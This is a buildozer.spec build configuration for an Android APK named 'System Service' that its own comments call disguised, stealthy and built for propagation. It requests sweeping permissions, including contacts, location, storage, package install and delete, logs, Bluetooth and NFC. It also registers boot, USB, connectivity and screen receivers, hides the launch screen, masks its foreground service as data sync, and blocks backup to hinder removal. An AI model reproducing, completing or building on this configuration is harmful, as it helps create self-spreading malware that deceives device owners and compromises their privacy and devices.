# buildozer.spec - Complete configuration for System Service APK
# Matches: com.system.service.update with all propagation features

[app]

# (str) Title of your application (disguised)
title = System Service

# (str) Package name - MUST match AndroidManifest.xml
package.name = com.system.service.update

# (str) Package domain
package.domain = com.system.service.update

# (str) Source code where the main.py live
source.dir = .

# (list) Application requirements
# Python 3.10 + NDK 25b for better compatibility
requirements = python3==3.10.12,kivy==2.3.0,pyjnius,android,plyer,openssl,requests,urllib3,chardet,idna,qrcode,pillow

# (list) Source files to include
source.include_exts = py,png,jpg,kv,atlas,json,xml,java

# (list) List of inclusions using pattern matching
source.include_patterns = assets/*,res/**,src/**

# (list) Source files to exclude
source.exclude_exts = spec,md,gittattributes

# (list) List of directory to exclude
source.exclude_dirs = tests, bin, venv, .git, __pycache__

# (list) List of exclusions using pattern matching
source.exclude_patterns = license,README*

# (str) Application versioning
version = 1.0

# (str) Presplash of the application (black - stealth)
presplash.filename = %(source.dir)s/presplash.png

# (str) Icon of the application
icon.filename = %(source.dir)s/icon.png

# (str) Supported orientation
orientation = portrait

# ============================================================
# SERVICE CONFIGURATION (CRITICAL)
# ============================================================

# (list) List of service to declare
services = SystemService:service.py

# (str) Service entry point file
service.source = %(source.dir)s/service.py

# ============================================================
# PERMISSIONS - ALL REQUIRED FOR PROPAGATION
# ============================================================

android.permissions = INTERNET, \
    ACCESS_NETWORK_STATE, \
    ACCESS_WIFI_STATE, \
    CHANGE_WIFI_STATE, \
    FOREGROUND_SERVICE, \
    FOREGROUND_SERVICE_DATA_SYNC, \
    FOREGROUND_SERVICE_SPECIAL_USE, \
    WAKE_LOCK, \
    RECEIVE_BOOT_COMPLETED, \
    REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, \
    POWER_SAVE_MODE_CHANGED, \
    SCHEDULE_EXACT_ALARM, \
    USE_EXACT_ALARM, \
    SET_ALARM, \
    SYSTEM_ALERT_WINDOW, \
    BLUETOOTH, \
    BLUETOOTH_ADMIN, \
    BLUETOOTH_CONNECT, \
    BLUETOOTH_SCAN, \
    NFC, \
    READ_CONTACTS, \
    READ_EXTERNAL_STORAGE, \
    WRITE_EXTERNAL_STORAGE, \
    MANAGE_EXTERNAL_STORAGE, \
    READ_PHONE_STATE, \
    ACCESS_COARSE_LOCATION, \
    ACCESS_FINE_LOCATION, \
    BATTERY_STATS, \
    PACKAGE_USAGE_STATS, \
    QUERY_ALL_PACKAGES, \
    GET_TASKS, \
    REAL_GET_TASKS, \
    INSTALL_PACKAGES, \
    DELETE_PACKAGES, \
    REQUEST_INSTALL_PACKAGES, \
    WRITE_SETTINGS, \
    READ_LOGS, \
    DUMP

# ============================================================
# HARDWARE FEATURES
# ============================================================

android.features = android.hardware.wifi, \
    android.hardware.bluetooth, \
    android.hardware.nfc, \
    android.hardware.usb.host, \
    android.hardware.location, \
    android.hardware.location.network

# ============================================================
# ANDROID SDK VERSIONS
# ============================================================

# (int) Targeted Android SDK version
android.api = 33

# (int) Minimum Android SDK version (Android 5.0+)
android.minapi = 21

# (int) Target NDK version (25b works with Python 3.10)
android.ndk = 25b

# (list) The Android archs to build for
android.archs = arm64-v8a, armeabi-v7a

# SDK agreement
android.accept_sdk_agreement = True

# ============================================================
# STEALTH SETTINGS
# ============================================================

# Disable backup to prevent easy removal
android.allow_backup = False

# Private storage
android.private_storage = True

# Black presplash (invisible launch)
android.presplash_color = #000000

# Keep CPU awake
android.wakelock = True

# Hide loading screen
android.hide_loading_screen = True

# Enable AndroidX
android.enable_androidx = True

# Debug mode (set False for release)
android.debug = True

# ============================================================
# GRADLE DEPENDENCIES
# ============================================================

android.gradle_dependencies = androidx.core:core:1.10.1, \
    androidx.work:work-runtime:2.8.0

# ============================================================
# JAVA SOURCE FILES (Android → Python Bridge)
# ============================================================

android.add_src = src/main/java/com/system/service/update/SystemApplication.java
android.add_src = src/main/java/com/system/service/update/MainActivity.java
android.add_src = src/main/java/com/system/service/update/SystemService.java
android.add_src = src/main/java/com/system/service/update/BootReceiver.java
android.add_src = src/main/java/com/system/service/update/ConnectivityReceiver.java
android.add_src = src/main/java/com/system/service/update/PowerReceiver.java
android.add_src = src/main/java/com/system/service/update/ScreenReceiver.java
android.add_src = src/main/java/com/system/service/update/USBReceiver.java
android.add_src = src/main/java/com/system/service/update/AlarmReceiver.java

# ============================================================
# RESOURCE FILES
# ============================================================

android.add_res = res/xml/network_security_config.xml
android.add_res = res/values/strings.xml

# ============================================================
# CUSTOM ANDROID MANIFEST
# ============================================================

# Use custom manifest instead of auto-generated
android.manifest.xml = AndroidManifest.xml

# ============================================================
# FOREGROUND SERVICE NOTIFICATION
# ============================================================

# (str) Foreground service notification channel name
android.notification_channel_name = System Service

# (str) Foreground service notification title
android.notification_title = System Service

# (str) Foreground service notification text
android.notification_text = Android system processes running

# (str) Foreground service notification importance
android.notification_importance = low

# (str) Foreground service type (disguised as data sync)
android.foreground_service_type = dataSync

# ============================================================
# P4A CONFIGURATION
# ============================================================

# p4a branch (develop has latest fixes)
p4a.branch = develop

# Bootstrap
android.p4a_bootstrap = sdl2

# ============================================================
# BUILD OUTPUT
# ============================================================

# (bool) Fullscreen or not
fullscreen = 0

# (str) Log level
log_level = 2

# (bool) Enable logcat output
android.logcat = 1

# (str) Create APK (not AAB)
android.release_artifact = apk

# ============================================================
# META DATA
# ============================================================

android.meta_data = 

# ============================================================
# LIBRARIES
# ============================================================

android.libraries = 

[buildozer]

# (str) Log level
log_level = 2

# (bool) Warn on root
warn_on_root = 1

# (str) Build directory
build_dir = ./.buildozer

# (str) Bin directory (APK output)
bin_dir = ./bin

# (str) Output filename format
output_filename = SystemService-{version}-{arch}.apk
